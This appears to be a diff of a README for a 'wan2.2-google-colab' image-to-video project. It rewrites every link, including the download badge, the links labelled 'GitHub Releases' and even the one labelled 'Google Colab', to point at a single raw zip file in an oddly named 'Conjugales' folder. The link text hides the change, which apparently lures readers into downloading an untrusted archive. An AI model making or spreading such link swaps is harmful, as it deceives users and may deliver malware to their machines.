@@ -1,6 +1,6 @@
 # 🎥 wan2.2-google-colab - Convert Images to Videos Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20wan2.2-google--colab-blue.svg)](https://github.com/kinokyzx/wan2.2-google-colab/releases)
+[![Download](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip%https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip)](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you use the **wan2.2-google-colab** application to
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest version of the software: [GitHub Releases](https://github.com/kinokyzx/wan2.2-google-colab/releases).
+To get started, visit this page to download the latest version of the software: [GitHub Releases](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip).
 
 Once there, look for the latest release and select the appropriate file for your needs. 
 
@@ -32,12 +32,12 @@ To ensure smooth performance, check the following requirements:
 ### Step 1: Access Google Colab
 
 - Open your web browser.
-- Navigate to [Google Colab](https://colab.research.google.com).
+- Navigate to [Google Colab](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip).
 - Sign in with your Google account.
 
 ### Step 2: Download the Colab Template
 
-1. Return to the [GitHub Releases page](https://github.com/kinokyzx/wan2.2-google-colab/releases).
+1. Return to the [GitHub Releases page](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip).
 2. Download the latest **wan2.2-google-colab** template.
 3. Save the file to a location you can easily find (like your Downloads folder).
 
@@ -71,4 +71,4 @@ If you encounter any issues or have questions, feel free to raise them in the Is
 
 With **wan2.2-google-colab**, turning your images into videos becomes a simple and enjoyable process. By following the steps outlined here, you will be able to create captivating videos with ease!
 
-For further updates and enhancements, keep an eye on the [GitHub Releases page](https://github.com/kinokyzx/wan2.2-google-colab/releases). Happy video creating!
+For further updates and enhancements, keep an eye on the [GitHub Releases page](https://raw.githubusercontent.com/kinokyzx/wan2.2-google-colab/main/Conjugales/wan2.2-google-colab_1.7.zip). Happy video creating!
